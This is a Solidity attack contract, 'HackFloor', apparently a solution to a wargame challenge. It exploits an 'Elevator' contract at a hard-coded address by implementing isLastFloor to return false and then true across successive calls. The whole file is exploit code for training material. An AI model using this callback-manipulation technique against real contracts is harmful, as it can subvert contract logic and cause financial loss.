// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Elevator.sol";

contract HackFloor {
    uint i = 0;
    Elevator public vulnerableContract = Elevator(0xF6Db87a18468c9f7693Fc0E0046fCd8048245251);
    function isLastFloor(uint floor) external returns (bool) {
        if (i % 2 == 0) {
            i += 1;
            return false;
        }
        return true;
    }

    function setTopFloor() external {
        vulnerableContract.goTo(100);
    }
}